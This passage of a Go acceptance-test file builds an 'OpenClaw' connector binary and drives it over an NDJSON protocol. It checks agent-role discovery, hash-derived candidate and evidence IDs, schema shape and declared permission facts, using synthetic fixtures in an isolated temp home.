// Native contract acceptance for the OpenClaw connector
// (CL-03-OPENCLAW-NATIVE-CLOSEOUT).
//
// Every test here builds the real connector binary from the CURRENT worktree
// sources into an isolated temp dir and drives it as a child process over the
// NDJSON connector-protocol.v1 wire (`<binary> --serve`). No mock dispatch, no
// canned responses, no direct calls into collectOp/validateScope.
//
// Independence rules honored here:
//   - expected candidate IDs / evidence IDs / content hashes / cursors are
//     computed from the contract formulas in
//     packages/contracts/enterprise-openclaw-identity.v2.md (and the default
//     role / skill selection / collection status / config integrity /
//     JSON5 contracts) using only the standard library (crypto/sha256 +
//     encoding/json) — never via production helpers such as
//     protocol.ContentHash, collectOp or declaredSkillSelection;
//   - all config roots, configs and secret canaries are synthetic fixtures
//     under the test temp dir; the child's HOME is redirected there and holds
//     a decoy ~/.openclaw that must never be read;
//   - the child process gets a minimal environment whitelist (HOME +
//     SIQ_CONNECTOR_*), never the developer's real env or credentials;
//   - every child is reaped by t.Cleanup (close stdin -> wait -> kill), every
//     RPC has a timeout, and captured stderr is size-capped.
package main

import (
	"bufio"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path"
	"path/filepath"
	"reflect"
	"strings"
	"sync"
	"testing"
	"time"
)

const nativeRPCTimeout = 30 * time.Second

// --- binary build (current worktree, isolated output) ----------------------

var (
	nativeBinaryOnce sync.Once
	nativeBinaryPath string
	nativeBinaryErr  error
)

// nativeBinary builds the connector from the current (possibly uncommitted)
// worktree sources into a fresh temp dir. The checked-in
// connectors/openclaw/openclaw binary is never touched or executed.
func nativeBinary(t *testing.T) string {
	t.Helper()
	nativeBinaryOnce.Do(func() {
		dir, err := os.MkdirTemp("", "openclaw-native-bin-")
		if err != nil {
			nativeBinaryErr = err
			return
		}
		nativeBinaryPath = filepath.Join(dir, "openclaw-connector-native")
		ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
		defer cancel()
		cmd := exec.CommandContext(ctx, "go", "build", "-o", nativeBinaryPath, ".")
		cmd.Env = append(os.Environ(), "GOPROXY=off", "GOTOOLCHAIN=local")
		out := &cappedBuffer{max: 1 << 20}
		cmd.Stdout, cmd.Stderr = out, out
		err = cmd.Run()
		if err != nil {
			nativeBinaryErr = fmt.Errorf("native build failed: %v\n%s", err, out.String())
		} else if out.Overflowed() {
			nativeBinaryErr = fmt.Errorf("native build output exceeded capture budget")
		}
	})
	if nativeBinaryErr != nil {
		t.Fatal(nativeBinaryErr)
	}
	return nativeBinaryPath
}

func TestMain(m *testing.M) {
	code := m.Run()
	if nativeBinaryPath != "" {
		os.RemoveAll(filepath.Dir(nativeBinaryPath))
	}
	os.Exit(code)
}

// --- child process session -------------------------------------------------

type cappedBuffer struct {
	mu       sync.Mutex
	buf      []byte
	max      int
	overflow bool
}

func (b *cappedBuffer) Write(p []byte) (int, error) {
	b.mu.Lock()
	defer b.mu.Unlock()
	if len(p) > b.max-len(b.buf) {
		b.overflow = true
	}
	if room := b.max - len(b.buf); room > 0 {
		b.buf = append(b.buf, p[:min(room, len(p))]...)
	} else {
		b.overflow = true
	}
	return len(p), nil
}

func (b *cappedBuffer) Overflowed() bool {
	b.mu.Lock()
	defer b.mu.Unlock()
	return b.overflow
}

func (b *cappedBuffer) String() string {
	b.mu.Lock()
	defer b.mu.Unlock()
	return string(b.buf)
}

type nativeSession struct {
	cmd    *exec.Cmd
	stdin  io.WriteCloser
	stdout *bufio.Reader
	stderr *cappedBuffer
	lines  []string // every raw stdout line, for purity / leak assertions
}

// startNativeSession launches `<binary> --serve` with a minimal env whitelist
// (contract §1: SIQ_CONNECTOR_NAME/VERSION/TIMEOUT_MS; HOME points at the test
// temp dir). No real user config, credentials or proxy variables are inherited.
func startNativeSession(t *testing.T, home string) *nativeSession {
	t.Helper()
	cmd := exec.Command(nativeBinary(t), "--serve")
	cmd.Env = []string{
		"HOME=" + home,
		"SIQ_CONNECTOR_NAME=openclaw",
		"SIQ_CONNECTOR_VERSION=native-acceptance",
		"SIQ_CONNECTOR_TIMEOUT_MS=30000",
	}
	stdin, err := cmd.StdinPipe()
	if err != nil {
		t.Fatal(err)
	}
	stdoutPipe, err := cmd.StdoutPipe()
	if err != nil {
		t.Fatal(err)
	}
	s := &nativeSession{
		cmd:    cmd,
		stdin:  stdin,
		stdout: bufio.NewReader(stdoutPipe),
		stderr: &cappedBuffer{max: 1 << 20},
	}
	cmd.Stderr = s.stderr
	if err := cmd.Start(); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		s.shutdown()
		if s.stderr.Overflowed() {
			t.Error("native stderr exceeded capture budget; leak assertions are incomplete")
		}
	})
	return s
}

// shutdown closes stdin, gives the child a grace period to exit, then kills
// and reaps it. Runs on every test cleanup so failures/timeouts never leak
// processes.
func (s *nativeSession) shutdown() {
	_ = s.stdin.Close()
	done := make(chan error, 1)
	go func() { done <- s.cmd.Wait() }()
	select {
	case <-done:
	case <-time.After(5 * time.Second):
		_ = s.cmd.Process.Kill()
		<-done
	}
}

// rpc writes one NDJSON request and reads exactly one response line. It
// enforces protocol purity: the line must be a single valid JSON protocol
// message whose id matches the request (contract §1/§2).
func (s *nativeSession) rpc(t *testing.T, id, op string, params any) (map[string]any, string) {
	t.Helper()
	var rawParams json.RawMessage
	switch p := params.(type) {
	case nil:
		rawParams = json.RawMessage(`{}`)
	case json.RawMessage:
		rawParams = p
	default:
		b, err := json.Marshal(p)
		if err != nil {
			t.Fatal(err)
		}
		rawParams = b
	}
	reqLine, err := json.Marshal(map[string]any{"id": id, "op": op, "params": rawParams})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := s.stdin.Write(append(reqLine, '\n')); err != nil {
		t.Fatalf("request %s: write: %v", id, err)
	}
	type readResult struct {
		line string
		err  error
	}
	ch := make(chan readResult, 1)
	go func() {
		line, err := readNativeLine(s.stdout, 8<<20)
		ch <- readResult{line, err}
	}()
	var line string
	select {
	case r := <-ch:
		if r.err != nil {
			t.Fatalf("request %s op=%s: read: %v (stderr: %s)", id, op, r.err, s.stderr.String())
		}
		line = strings.TrimSuffix(r.line, "\n")
	case <-time.After(nativeRPCTimeout):
		_ = s.cmd.Process.Kill()
		t.Fatalf("request %s op=%s: timeout after %s", id, op, nativeRPCTimeout)
	}
	if line == "" {
		t.Fatalf("request %s op=%s: empty stdout line violates NDJSON protocol", id, op)
	}
	var resp map[string]any
	if err := json.Unmarshal([]byte(line), &resp); err != nil {
		t.Fatalf("request %s op=%s: stdout line is not protocol JSON: %v", id, op, err)
	}
	if resp["id"] != id {
		t.Fatalf("response id %v does not match request id %q", resp["id"], id)
	}
	if _, ok := resp["ok"].(bool); !ok {
		t.Fatalf("response %s missing boolean ok field", id)
	}
	s.lines = append(s.lines, line)
	return resp, line
}

// Bound each response even if a broken child emits an unterminated line.
func readNativeLine(reader *bufio.Reader, limit int) (string, error) {
	var line []byte
	for {
		fragment, err := reader.ReadSlice('\n')
		if len(fragment) > limit-len(line) {
			return "", fmt.Errorf("native stdout line exceeded capture budget")
		}
		line = append(line, fragment...)
		if err == bufio.ErrBufferFull {
			continue
		}
		return string(line), err
	}
}

func TestNativeCaptureBounds(t *testing.T) {
	buffer := &cappedBuffer{max: 4}
	_, _ = buffer.Write([]byte("12345"))
	if !buffer.Overflowed() || buffer.String() != "1234" {
		t.Fatal("single-write truncation must invalidate capture")
	}
	if _, err := readNativeLine(bufio.NewReader(strings.NewReader("12345")), 4); err == nil {
		t.Fatal("unterminated oversized response must fail")
	}
	line, err := readNativeLine(bufio.NewReader(strings.NewReader("123\n")), 4)
	if err != nil || line != "123\n" {
		t.Fatal("exact-limit complete response must remain valid")
	}
}

// collectOK runs one collect that must succeed.
func (s *nativeSession) collectOK(t *testing.T, id string, roots, include []string, maxFiles, maxBytes int64) (map[string]any, string) {
	t.Helper()
	resp, raw := s.rpc(t, id, "collect", map[string]any{
		"plan": map[string]any{
			"scope":  map[string]any{"roots": roots, "include": include},
			"limits": map[string]any{"max_files": maxFiles, "max_bytes": maxBytes},
		},
	})
	return rpcOK(t, resp), raw
}

// collectErr runs one collect that must fail; returns the error object.
func (s *nativeSession) collectErr(t *testing.T, id string, roots []string, maxBytes int64) map[string]any {
	t.Helper()
	resp, _ := s.rpc(t, id, "collect", map[string]any{
		"plan": map[string]any{
			"scope":  map[string]any{"roots": roots},
			"limits": map[string]any{"max_files": 200, "max_bytes": maxBytes},
		},
	})
	return rpcError(t, resp)
}

// validateScope runs one validate_scope op and returns its result object.
func (s *nativeSession) validateScope(t *testing.T, id string, scope any) map[string]any {
	t.Helper()
	resp, _ := s.rpc(t, id, "validate_scope", map[string]any{"scope": scope})
	return rpcOK(t, resp)
}

// allOutput returns everything the child ever printed (stdout protocol lines
// + captured stderr) for secret/marker leak assertions.
func (s *nativeSession) allOutput() string {
	return strings.Join(s.lines, "\n") + "\n--- stderr ---\n" + s.stderr.String()
}

// --- response helpers ------------------------------------------------------

func rpcOK(t *testing.T, resp map[string]any) map[string]any {
	t.Helper()
	if resp["ok"] != true {
		t.Fatalf("request failed: %v", resp["error"])
	}
	result, ok := resp["result"].(map[string]any)
	if !ok {
		t.Fatalf("response missing result object: %v", resp)
	}
	return result
}

func rpcError(t *testing.T, resp map[string]any) map[string]any {
	t.Helper()
	if resp["ok"] != false {
		t.Fatalf("expected failure response, got ok=true result=%v", resp["result"])
	}
	e, ok := resp["error"].(map[string]any)
	if !ok {
		t.Fatalf("failure response missing error object: %v", resp)
	}
	return e
}

func mapOf(t *testing.T, v any, what string) map[string]any {
	t.Helper()
	m, ok := v.(map[string]any)
	if !ok {
		t.Fatalf("%s: expected object, got %T", what, v)
	}
	return m
}

func listOf(t *testing.T, m map[string]any, key string) []any {
	t.Helper()
	v, ok := m[key]
	if !ok {
		t.Fatalf("result missing %q", key)
	}
	l, ok := v.([]any)
	if !ok {
		t.Fatalf("result.%s: expected list, got %T", key, v)
	}
	return l
}

func strOf(t *testing.T, m map[string]any, key string) string {
	t.Helper()
	v, ok := m[key]
	if !ok {
		t.Fatalf("object missing %q", key)
	}
	s, ok := v.(string)
	if !ok {
		t.Fatalf("%s: expected string, got %T", key, v)
	}
	return s
}

// --- independent expectation oracles (contract formulas, stdlib only) ------
//
// enterprise-openclaw-identity.v2.md:
//
//	candidate_id    = "openclaw:v2:" + SHA-256(JSON([canonical_abs_root, agent.id]))
//	source_locator  = "openclaw://agents/v2/" + the same digest
//	evidence_id     = "ev:openclaw:v2:" + SHA-256(JSON([role_digest, full_config_digest]))
//	auth metadata   = "ev:openclaw:auth-profiles:v2:" + SHA-256(root bytes)
//	framework_source.instance_key = SHA-256(JSON(["enterprise-openclaw-config-instance/v1", root]))
//	skill root locator = SHA-256(path.Join(workspace, suffix) bytes)
//	cursor          = "openclaw-cursor:" + hex(SHA-256(concat(candidate_id + 0x00 ...)))
//
// None of these call production helpers; sha256/hex/json are stdlib.

func oracleSHA256(b []byte) string {
	sum := sha256.Sum256(b)
	return hex.EncodeToString(sum[:])
}

// oracleJSON renders the contract formula's JSON([...]) string-array form with
// the standard library encoder only.
func oracleJSON(t *testing.T, parts ...string) []byte {
	t.Helper()
	b, err := json.Marshal(parts)
	if err != nil {
		t.Fatal(err)
	}
	return b
}

func wantRoleKey(t *testing.T, root, id string) string {
	t.Helper()
	return oracleSHA256(oracleJSON(t, root, id))
}

func wantCandidateID(t *testing.T, root, id string) string {
	t.Helper()
	return "openclaw:v2:" + wantRoleKey(t, root, id)
}

func wantSourceLocator(t *testing.T, root, id string) string {
	t.Helper()
	return "openclaw://agents/v2/" + wantRoleKey(t, root, id)
}

func wantEvidenceID(t *testing.T, root, id, cfgHash string) string {
	t.Helper()
	return "ev:openclaw:v2:" + oracleSHA256(oracleJSON(t, wantRoleKey(t, root, id), cfgHash))
}

func wantAuthEvidenceID(root string) string {
	return "ev:openclaw:auth-profiles:v2:" + oracleSHA256([]byte(root))
}

func wantInstanceKey(t *testing.T, root string) string {
	t.Helper()
	return oracleSHA256(oracleJSON(t, "enterprise-openclaw-config-instance/v1", root))
}

func wantSkillRootLocator(workspace, suffix string) string {
	return oracleSHA256([]byte(path.Join(workspace, suffix)))
}

func wantCursor(ids []string) string {
	h := sha256.New()
	for _, id := range ids {
		h.Write([]byte(id))
		h.Write([]byte{0})
	}
	return "openclaw-cursor:" + hex.EncodeToString(h.Sum(nil))
}

func wantFileHash(t *testing.T, path string) string {
	t.Helper()
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	return oracleSHA256(data)
}

// canonicalFixtureDir enforces that the hashed lexical path (contract v2:
// digest input is the cleaned absolute root) is not skewed by symlinked
// temp-dir components on this machine.
func canonicalFixtureDir(t *testing.T, dir string) string {
	t.Helper()
	abs, err := filepath.Abs(dir)
	if err != nil {
		t.Fatal(err)
	}
	clean := filepath.Clean(abs)
	resolved, err := filepath.EvalSymlinks(clean)
	if err != nil {
		t.Fatal(err)
	}
	if resolved != clean {
		t.Fatalf("fixture path %q not canonical (resolves to %q)", clean, resolved)
	}
	return clean
}

func writeOpenClawConfig(t *testing.T, root, body string) string {
	t.Helper()
	if err := os.MkdirAll(root, 0o755); err != nil {
		t.Fatal(err)
	}
	cfg := filepath.Join(root, "openclaw.json")
	if err := os.WriteFile(cfg, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	return cfg
}

func writeAuthProfiles(t *testing.T, root, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Join(root, "agents"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "agents", "auth-profiles.json"), []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
}

// --- wire shape guards (candidate/evidence/permission-fact schemas) --------

var candidateAllowedKeys = map[string]bool{
	"candidate_id": true, "source_type": true, "source_locator": true,
	"discovered_at": true, "name": true, "framework": true,
	"artifact_digest": true, "attributes": true, "evidence_ids": true,
	"confidence": true, "status": true,
}
var candidateRequiredKeys = []string{
	"candidate_id", "source_type", "source_locator", "discovered_at",
	"name", "framework", "evidence_ids",
}

var evidenceAllowedKeys = map[string]bool{
	"evidence_id": true, "tenant_id": true, "environment_id": true,
	"source_type": true, "source_locator": true, "subject_ref": true,
	"observed_at": true, "collected_at": true, "collector_id": true,
	"connector_version": true, "content_hash": true, "redaction_profile": true,
	"classification": true, "payload_ref": true, "signature": true,
	"signing_schema": true, "expires_at": true,
}
var evidenceRequiredKeys = []string{
	"evidence_id", "source_type", "source_locator", "observed_at",
	"collected_at", "collector_id", "connector_version", "content_hash",
	"redaction_profile", "classification", "signature",
}

var factAllowedKeys = map[string]bool{
	"subject": true, "delegated_user": true, "domain": true, "action": true,
	"resource": true, "effect": true, "conditions": true, "state": true,
	"authority": true, "authority_revision": true, "evidence_ids": true,
}

func checkRFC3339(t *testing.T, what, value string) {
	t.Helper()
	if _, err := time.Parse(time.RFC3339, value); err != nil {
		t.Errorf("%s %q is not RFC3339: %v", what, value, err)
	}
}

// checkBatchShape validates the wire shape against candidate.schema.json /
// evidence.schema.json / permission-fact.schema.json and the declared-only
// permission rule (no effective facts may ever leave a connector).
func checkBatchShape(t *testing.T, batch map[string]any) {
	t.Helper()
	for _, c := range listOf(t, batch, "candidates") {
		cm := mapOf(t, c, "candidate")
		for k := range cm {
			if !candidateAllowedKeys[k] {
				t.Errorf("candidate carries key %q outside candidate.schema.json", k)
			}
		}
		for _, k := range candidateRequiredKeys {
			if _, ok := cm[k]; !ok {
				t.Errorf("candidate missing required key %q", k)
			}
		}
		checkRFC3339(t, "candidate.discovered_at", strOf(t, cm, "discovered_at"))
	}
	for _, e := range listOf(t, batch, "evidence") {
		em := mapOf(t, e, "evidence")
		for k := range em {
			if !evidenceAllowedKeys[k] {
				t.Errorf("evidence carries key %q outside evidence.schema.json", k)
			}
		}
		for _, k := range evidenceRequiredKeys {
			if _, ok := em[k]; !ok {
				t.Errorf("evidence missing required key %q", k)
			}
		}
		if v, ok := em["payload_ref"]; ok && v != nil {
			t.Errorf("evidence %s: payload_ref must stay null/absent (content never leaves the connector)", strOf(t, em, "evidence_id"))
		}
		// Contract §5: collector_id/signature are filled by the Edge at
		// packaging time; the connector must emit them empty.
		if strOf(t, em, "collector_id") != "" || strOf(t, em, "signature") != "" {
			t.Errorf("evidence %s: collector_id/signature must be empty on the wire", strOf(t, em, "evidence_id"))
		}
		checkRFC3339(t, "evidence.observed_at", strOf(t, em, "observed_at"))
		checkRFC3339(t, "evidence.collected_at", strOf(t, em, "collected_at"))
	}
	for _, f := range factsOf(batch) {
		fm := mapOf(t, f, "permission_fact")
		for k := range fm {
			if !factAllowedKeys[k] {
				t.Errorf("permission fact carries key %q outside permission-fact.schema.json", k)
			}
		}
		for _, k := range []string{"subject", "domain", "action", "resource", "effect", "state", "authority", "evidence_ids"} {
			if _, ok := fm[k]; !ok {
				t.Errorf("permission fact missing required key %q", k)
			}
		}
		if got := strOf(t, fm, "state"); got != "declared" {
			t.Errorf("permission fact state=%q, connector facts must stay declared (never effective)", got)
		}
	}
}

// checkReferenceIntegrity enforces the batch rule: every evidence must be
// referenced by at least one candidate of the same batch, and every candidate
// reference must resolve.
func checkReferenceIntegrity(t *testing.T, batch map[string]any) {
	t.Helper()
	referenced := map[string]bool{}
	evs := indexEvidence(t, batch)
	for _, c := range listOf(t, batch, "candidates") {
		cm := mapOf(t, c, "candidate")
		for _, id := range listOf(t, cm, "evidence_ids") {
			s, ok := id.(string)
			if !ok {
				t.Fatalf("candidate evidence_ids must be strings")
			}
			referenced[s] = true
			if _, ok := evs[s]; !ok {
				t.Errorf("candidate %s references missing evidence %s", strOf(t, cm, "candidate_id"), s)
			}
		}
	}
	for id := range evs {
		if !referenced[id] {
			t.Errorf("orphan evidence %s not referenced by any candidate", id)
		}
	}
}

func indexCandidates(t *testing.T, batch map[string]any) map[string]map[string]any {
	t.Helper()
	out := map[string]map[string]any{}
	for _, c := range listOf(t, batch, "candidates") {
		cm := mapOf(t, c, "candidate")
		id := strOf(t, cm, "candidate_id")
		if _, dup := out[id]; dup {
			t.Fatalf("duplicate candidate_id %s", id)
		}
		out[id] = cm
	}
	return out
}

func indexEvidence(t *testing.T, batch map[string]any) map[string]map[string]any {
	t.Helper()
	out := map[string]map[string]any{}
	for _, e := range listOf(t, batch, "evidence") {
		em := mapOf(t, e, "evidence")
		id := strOf(t, em, "evidence_id")
		if _, dup := out[id]; dup {
			t.Fatalf("duplicate evidence_id %s", id)
		}
		out[id] = em
	}
	return out
}

func factsOf(batch map[string]any) []any {
	if v, ok := batch["permission_facts"]; ok {
		if l, ok := v.([]any); ok {
			return l
		}
	}
	return nil
}

func attributesOf(t *testing.T, cand map[string]any) map[string]any {
	t.Helper()
	v, ok := cand["attributes"]
	if !ok || v == nil {
		return map[string]any{}
	}
	return mapOf(t, v, "candidate.attributes")
}

// attrString extracts one string attribute, failing on absence or wrong type.
func attrString(t *testing.T, cand map[string]any, key string) string {
	t.Helper()
	v, ok := attributesOf(t, cand)[key]
	if !ok {
		t.Fatalf("candidate %s missing attribute %q", cand["candidate_id"], key)
	}
	s, ok := v.(string)
	if !ok {
		t.Fatalf("attribute %q: expected string, got %T", key, v)
	}
	return s
}

// --- J1. protocol purity + role discovery + unsupported configs -------------

func TestNativeProtocolAndRoleDiscovery(t *testing.T) {
	home := t.TempDir()
	base := canonicalFixtureDir(t, t.TempDir())

	// Decoy default location: ~/.openclaw exists with a unique agent id but is
	// never in scope; nothing may pick it up (no default scope, contract §1/§4).
	decoyRoot := filepath.Join(home, ".openclaw")
	writeOpenClawConfig(t, decoyRoot, `{"agents":{"list":[{"id":"decoy-never-collected","model":"decoy/model"}]}}`)

	// Explicit list layout with two roles.
	rootList := filepath.Join(base, "root-list")
	cfgList := writeOpenClawConfig(t, rootList, `{
  "agents": {"list": [
    {"id": "alpha", "name": "Alpha Role", "workspace": "`+filepath.Join(base, "ws-alpha")+`", "model": "kimi/kimi-code"},
    {"id": "beta", "model": {"primary": "minimax/MiniMax-M3", "fallbacks": ["kimi/kimi-code"]}}
  ]}
}`)
	// Entries layout: keys are the identities; iteration order must be sorted.
	rootEntries := filepath.Join(base, "root-entries")
	writeOpenClawConfig(t, rootEntries, `{"agents":{"entries":{"zeta":{"model":"m/z"},"omega":{"model":"m/o"}}}}`)
	// No roster at all: the contract default role inference yields main.
	rootDefault := filepath.Join(base, "root-default")
	writeOpenClawConfig(t, rootDefault, `{"agents":{"defaults":{"workspace":"`+filepath.Join(base, "ws-default")+`","model":"defaults/model"}}}`)

	s := startNativeSession(t, home)

	// describe: capabilities per contract §2.
	resp, _ := s.rpc(t, "j1-01", "describe", nil)
	caps := rpcOK(t, resp)
	if strOf(t, caps, "version") == "" {
		t.Error("describe: version must be non-empty")
	}
	if objects := listOf(t, caps, "objects"); len(objects) != 1 || objects[0] != "openclaw_agent" {
		t.Errorf("describe: objects=%v, want [openclaw_agent]", objects)
	}
	if perms := listOf(t, caps, "required_permissions"); len(perms) != 1 ||
		!strings.HasPrefix(perms[0].(string), "read:") {
		t.Errorf("describe: required_permissions=%v", perms)
	}
	if cats := listOf(t, caps, "data_categories"); !reflect.DeepEqual(cats,
		[]any{"agent_names", "model_ids", "workspace_paths"}) {
		t.Errorf("describe: data_categories=%v", cats)
	}
	if caps["max_output_bytes"] != float64(8*1024*1024) {
		t.Errorf("describe: max_output_bytes=%v, want 8388608", caps["max_output_bytes"])
	}
	if caps["network_access"] != false {
		t.Errorf("describe: network_access=%v, want false", caps["network_access"])
	}

	// health + empty checkpoint before any collect.
	resp, _ = s.rpc(t, "j1-02", "health", nil)
	health := rpcOK(t, resp)
	if strOf(t, health, "version") == "" {
		t.Error("health: version must be non-empty")
	}
	if _, ok := health["dependencies"].([]any); !ok {
		t.Error("health: dependencies must be an array")
	}
	resp, _ = s.rpc(t, "j1-03", "checkpoint", nil)
	if c := rpcOK(t, resp)["cursor"]; c != nil && c != "" {
		t.Errorf("checkpoint before any collect must be empty, got %v", c)
	}

	// plan_scan echoes the scope with the default include and limits.
	resp, _ = s.rpc(t, "j1-04", "plan_scan", map[string]any{"scope": map[string]any{"roots": []string{rootList}}})
	plan := rpcOK(t, resp)
	scope := mapOf(t, plan["scope"], "plan.scope")
	if inc := listOf(t, scope, "include"); len(inc) != 1 || inc[0] != "openclaw.json" {
		t.Errorf("plan_scan: include=%v, want [openclaw.json]", inc)
	}
	limits := mapOf(t, plan["limits"], "plan.limits")
	if limits["max_files"] != float64(200) || limits["max_bytes"] != float64(16*1024*1024) {
		t.Errorf("plan_scan: limits=%v, want 200 / 16777216", limits)
	}

	// Unknown op and malformed params fail closed without crashing the process.
	resp, _ = s.rpc(t, "j1-05", "obliterate", nil)
	if e := rpcError(t, resp); e["code"] != "unsupported" {
		t.Errorf("unknown op: code=%v, want unsupported", e["code"])
	}
	resp, _ = s.rpc(t, "j1-06", "collect", json.RawMessage(`"a-string"`))
	if e := rpcError(t, resp); e["code"] == "" || e["message"] == "" {
		t.Errorf("malformed collect params must fail with a typed error, got %v", e)
	}
	resp, _ = s.rpc(t, "j1-07", "describe", nil)
	rpcOK(t, resp)

	// Explicit list layout: identities and evidence per oracle.
	b1, _ := s.collectOK(t, "j1-08", []string{rootList}, nil, 200, 1<<20)
	checkBatchShape(t, b1)
	checkReferenceIntegrity(t, b1)
	cands := indexCandidates(t, b1)
	idAlpha, idBeta := wantCandidateID(t, rootList, "alpha"), wantCandidateID(t, rootList, "beta")
	if len(cands) != 2 || cands[idAlpha] == nil || cands[idBeta] == nil {
		t.Fatalf("list layout candidates=%v, want alpha+beta with oracle ids", cands)
	}
	hashList := wantFileHash(t, cfgList)
	evs := indexEvidence(t, b1)
	for _, tc := range []struct {
		root, id string
		hash     string
	}{{rootList, "alpha", hashList}, {rootList, "beta", hashList}} {
		cand := cands[wantCandidateID(t, tc.root, tc.id)]
		if strOf(t, cand, "source_locator") != wantSourceLocator(t, tc.root, tc.id) {
			t.Errorf("%s: source_locator=%q", tc.id, strOf(t, cand, "source_locator"))
		}
		if strOf(t, cand, "framework") != "openclaw" || strOf(t, cand, "source_type") != "openclaw_agent" {
			t.Errorf("%s: framework/source_type mismatch", tc.id)
		}
		evID := wantEvidenceID(t, tc.root, tc.id, tc.hash)
		if ids := listOf(t, cand, "evidence_ids"); len(ids) != 1 || ids[0] != evID {
			t.Errorf("%s: evidence_ids=%v, want [%s]", tc.id, ids, evID)
		}
		ev := evs[evID]
		if ev == nil {
			t.Fatalf("%s: evidence %s missing", tc.id, evID)
		}
		if strOf(t, ev, "content_hash") != tc.hash {
			t.Errorf("%s: evidence content_hash mismatch", tc.id)
		}
		if ref, _ := ev["subject_ref"].(string); ref != strOf(t, cand, "candidate_id") {
			t.Errorf("%s: evidence subject_ref not bound to its candidate", tc.id)
		}
		if got := attributesOf(t, cand)["role_identity_basis"]; got != "explicit_config" {
			t.Errorf("%s: role_identity_basis=%v, want explicit_config", tc.id, got)
		}
		// framework_source carries the oracle instance key + full config digest.
		raw, ok := attributesOf(t, cand)["framework_source"].(string)
		if !ok {
			t.Fatalf("%s: framework_source missing or not a string", tc.id)
		}
		var fsValue map[string]string
		if err := json.Unmarshal([]byte(raw), &fsValue); err != nil {
			t.Fatalf("%s: framework_source not a JSON object: %v", tc.id, err)
		}
		if fsValue["schema_version"] != "enterprise-framework-source/v1" ||
			fsValue["framework"] != "openclaw" ||
			fsValue["instance_key"] != wantInstanceKey(t, tc.root) ||
			fsValue["config_sha256"] != tc.hash ||
			fsValue["evidence_id"] != wantEvidenceID(t, tc.root, tc.id, tc.hash) {
			t.Errorf("%s: framework_source=%v violates the contract projection", tc.id, fsValue)
		}
	}
	if strOf(t, cands[idAlpha], "name") != "Alpha Role" {
		t.Errorf("alpha: name=%q", strOf(t, cands[idAlpha], "name"))
	}
	if got := attributesOf(t, cands[idBeta])["models"]; got != "minimax/MiniMax-M3,kimi/kimi-code" {
		t.Errorf("beta: models=%q, want primary+fallbacks in order", got)
	}
	// Declared permission facts only: 3 model facts + 1 workspace fact.
	var modelFacts, fsFacts int
	for _, f := range factsOf(b1) {
		fm := mapOf(t, f, "permission_fact")
		sub := mapOf(t, fm["subject"], "permission_fact.subject")
		if strOf(t, sub, "type") != "agent_asset" {
			t.Errorf("fact subject.type=%q", strOf(t, sub, "type"))
		}
		subID := strOf(t, sub, "id")
		if subID != idAlpha && subID != idBeta {
			t.Errorf("fact bound to unknown subject %s", subID)
		}
		if strOf(t, fm, "effect") != "allow" || strOf(t, fm, "authority") != "openclaw-config" {
			t.Errorf("fact effect/authority drift: %v", fm)
		}
		switch strOf(t, fm, "domain") {
		case "model":
			modelFacts++
		case "filesystem":
			fsFacts++
			if subID != idAlpha {
				t.Errorf("filesystem fact bound to %s, want alpha (only alpha declares a workspace)", subID)
			}
		default:
			t.Errorf("unexpected fact domain %q", strOf(t, fm, "domain"))
		}
	}
	if modelFacts != 3 || fsFacts != 1 {
		t.Errorf("facts: model=%d filesystem=%d, want 3/1", modelFacts, fsFacts)
	}

	// Entries layout: map keys are the identities, output order sorted by key.
	b2, _ := s.collectOK(t, "j1-09", []string{rootEntries}, nil, 200, 1<<20)
	checkBatchShape(t, b2)
	cands2 := indexCandidates(t, b2)
	idOmega, idZeta := wantCandidateID(t, rootEntries, "omega"), wantCandidateID(t, rootEntries, "zeta")
	if len(cands2) != 2 || cands2[idOmega] == nil || cands2[idZeta] == nil {
		t.Fatalf("entries layout candidates=%v", cands2)
	}
	var order []string
	for _, c := range listOf(t, b2, "candidates") {
		order = append(order, strOf(t, mapOf(t, c, "candidate"), "candidate_id"))
	}
	// 合同：entries 以键为身份并按键排序（"omega" < "zeta"）；candidate_id 是
	// 位置摘要，其相对顺序不承载语义，只核对输出顺序与键序一致。
	wantOrder := []string{idOmega, idZeta}
	if !reflect.DeepEqual(order, wantOrder) {
		t.Errorf("entries candidates order=%v, want key-sorted %v", order, wantOrder)
	}

	// Default role inference: no roster -> exactly the oracle "main" identity,
	// basis config_default, inheriting defaults.workspace/model.
	b3, _ := s.collectOK(t, "j1-10", []string{rootDefault}, nil, 200, 1<<20)
	checkBatchShape(t, b3)
	cands3 := indexCandidates(t, b3)
	idMain := wantCandidateID(t, rootDefault, "main")
	if len(cands3) != 1 || cands3[idMain] == nil {
		t.Fatalf("default role candidates=%v, want exactly main", cands3)
	}
	if got := attributesOf(t, cands3[idMain])["role_identity_basis"]; got != "config_default" {
		t.Errorf("default role basis=%v, want config_default", got)
	}
	if got := attributesOf(t, cands3[idMain])["models"]; got != "defaults/model" {
		t.Errorf("default role must inherit defaults.model, got %q", got)
	}
	if strOf(t, cands3[idMain], "name") != "main" {
		t.Errorf("default role name=%q, want main", strOf(t, cands3[idMain], "name"))
	}

	// Explicit "main" and inferred "main" share one positional identity: after
	// replacing the config with an explicit roster containing main, the
	// candidate id stays the oracle id and only the basis flips.
	writeOpenClawConfig(t, rootDefault, `{"agents":{"list":[{"id":"main","name":"Explicit Main"}]}}`)
	b4, _ := s.collectOK(t, "j1-11", []string{rootDefault}, nil, 200, 1<<20)
	cands4 := indexCandidates(t, b4)
	if len(cands4) != 1 || cands4[idMain] == nil {
		t.Fatalf("explicit main must keep the same positional identity %s (got %v)", idMain, cands4)
	}
	if got := attributesOf(t, cands4[idMain])["role_identity_basis"]; got != "explicit_config" {
		t.Errorf("explicit main basis=%v, want explicit_config", got)
	}

	// Unsupported / ambiguous configurations never fabricate role facts:
	// case-folded field aliases, duplicate keys, $include, null rosters,
	// both layouts at once. Each must fail the whole collect with the fixed
	// error category, and no candidate may leak from them.
	badConfigs := map[string]string{
		"case-alias":   `{"Agents":{"list":[{"id":"ghost"}]}}`,
